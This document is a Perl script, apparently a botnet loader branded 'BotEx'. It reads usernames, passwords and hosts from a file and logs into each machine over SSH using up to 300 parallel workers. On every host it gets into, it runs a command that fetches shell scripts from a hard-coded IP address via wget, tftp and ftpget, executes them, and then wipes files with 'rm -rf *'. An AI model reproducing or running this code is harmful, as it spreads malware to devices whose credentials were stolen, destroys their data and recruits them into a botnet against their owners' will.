#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
#
# __________        __ /\_______________  ___
# \______   \ _____/  |)/\_   _____/\   \/  /
#  |    |  _//  _ \   __\ |    __)_  \     / 
#  |    |   (  <_> )  |   |        \ /     \ 
#  |______  /\____/|__|  /_______  //___/\  \
#         \/                     \/       \_/
#
open(fh,'<','bots.txt'); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 workers
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a worker
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.236/dick.sh; chmod 777 dick.sh; sh dick.sh; tftp 185.145.131.236 -c get titi1.sh; chmod 777 titi1.sh; sh titi1.sh; tftp -r titi2.sh -g 185.145.131.236; chmod 777 titi2.sh; sh titi2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.236 ass1.sh ass1.sh; sh ass1.sh; rm -rf dick.sh titi1.sh titi2.sh ass1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[1;37mCommand \e[1;36mSent To --> ".$newarray[$c]."\n";
                } else {
                        print "\e[0mCan't Authenticate Host 
$newarray[$c]\n";
                }
        } else {
                print "\e[1;37mCant Connect To Host $newarray[$c]\n";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;

